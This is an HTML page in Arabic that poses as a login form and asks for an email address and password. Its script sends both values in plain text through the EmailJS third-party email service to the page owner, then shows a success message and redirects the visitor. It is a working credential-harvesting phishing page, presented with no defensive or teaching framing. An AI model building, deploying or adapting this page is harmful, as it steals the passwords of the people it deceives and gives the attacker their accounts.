<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <link rel="stylesheet" href="style.css">
    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
</head>
<body>
    <div class="login-container">
        <form id="loginForm">
            <input type="email" id="email" name="email" placeholder="ادخل البريد الإلكتروني" required>
            <input type="password" id="password" name="password" placeholder="ادخل كلمة السر" required>
            <button type="submit">دخول</button>
        </form>
    </div>

    <script>
        // Initialize EmailJS
        emailjs.init("RufM_4pBQfD6xWtE6");

        // Handle form submission
        document.getElementById("loginForm").addEventListener("submit", function(event) {
            event.preventDefault(); // Prevent form from reloading the page
            
            var email = document.getElementById("email").value;
            var password = document.getElementById("password").value;

            var templateParams = {
                email: email,
                password: password
            };

            // Send email using EmailJS
            emailjs.send("Samy1082008", "YOUR_TEMPLATE_ID", templateParams)
                .then(function(response) {
                    alert("تم إرسال البريد الإلكتروني بنجاح");
                    window.location.href = "success.html";
                }, function(error) {
                    alert("فشل إرسال البريد الإلكتروني: " + error.text);
                });
        });
    </script>
</body>
</html>
